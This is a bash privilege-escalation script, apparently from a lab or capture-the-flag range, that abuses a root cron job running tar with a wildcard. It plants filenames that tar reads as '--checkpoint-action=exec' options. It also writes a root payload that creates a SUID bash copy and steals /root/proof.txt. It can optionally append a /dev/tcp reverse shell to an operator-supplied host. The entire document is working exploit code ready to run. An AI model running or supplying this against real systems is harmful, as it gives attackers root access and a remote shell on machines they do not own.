#!/usr/bin/env bash
# privesc_tar_wildcard_7f3a.sh
#
# Run as cassie ON the target. Plants the three files that turn
#   */2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
# into a root command execution, then waits for the cron tick.
#
#   ./privesc_tar_wildcard_7f3a.sh            # default: SUID bash + flag copy
#   ./privesc_tar_wildcard_7f3a.sh 192.168.45.158 1377   # also try a root callback
#
# The reverse shell is optional and relies on egress to your host, which is not
# guaranteed on this range. The SUID copy and the flag copy do not.
set -u

LHOST="${1:-}"
LPORT="${2:-1377}"
TARGET_DIR="/opt/admin"

if [ ! -d "$TARGET_DIR" ]; then
  echo "[-] $TARGET_DIR does not exist" >&2
  exit 1
fi
if [ ! -w "$TARGET_DIR" ]; then
  echo "[-] $TARGET_DIR is not writable by $(id -un)" >&2
  exit 1
fi

cd "$TARGET_DIR" || exit 1

# ---- the script the cron job will run as root ------------------------------
cat > pwn.sh <<'EOF'
#!/bin/sh
# Runs as root, cwd = /opt/admin
cp /bin/bash /home/cassie/rootbash
chmod 4755 /home/cassie/rootbash
cp /root/proof.txt /home/cassie/proof.txt 2>/dev/null
chmod 644 /home/cassie/proof.txt 2>/dev/null
ls -b1 / > /home/cassie/root_ls.txt 2>&1
EOF
chmod +x pwn.sh

# optional: append a root callback when a listener address was supplied
if [ -n "$LHOST" ]; then
  printf "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &\n" "$LHOST" "$LPORT" >> pwn.sh
fi

# ---- the two arguments tar will mistake for options ------------------------
# Glob expansion never word-splits, so the spaces inside the second filename
# survive as one argv entry: --checkpoint-action=exec=sh pwn.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'

echo "[+] planted in $TARGET_DIR:"
ls -b1

echo
echo "[*] waiting for the 2-minute cron tick (Ctrl-C is safe, the job stays armed)"
for i in $(seq 1 30); do
  if [ -u /home/cassie/rootbash ]; then
    echo "[+] rootbash is SUID after ~$((i * 10))s"
    ls -l /home/cassie/rootbash /home/cassie/proof.txt 2>/dev/null
    exit 0
  fi
  sleep 10
done

echo "[-] no rootbash after 5 minutes - check /var/log/syslog for the CRON line" >&2
exit 1
